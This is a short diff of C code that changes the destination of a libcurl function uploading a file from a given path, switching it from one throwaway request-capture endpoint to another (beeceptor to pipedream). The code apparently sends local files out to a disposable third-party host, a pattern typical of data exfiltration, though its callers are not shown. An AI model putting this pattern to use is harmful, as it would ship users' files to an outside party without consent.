@@ -14,7 +14,7 @@ int upload_file(const char *filepath) {
     curl_mime_name(part, "file");
     curl_mime_filedata(part, filepath);
 
-    curl_easy_setopt(curl, CURLOPT_URL, "https://inf0-get.free.beeceptor.com");
+    curl_easy_setopt(curl, CURLOPT_URL, "https://eoaelo9y53bg88l.m.pipedream.net");
     curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
     curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
 
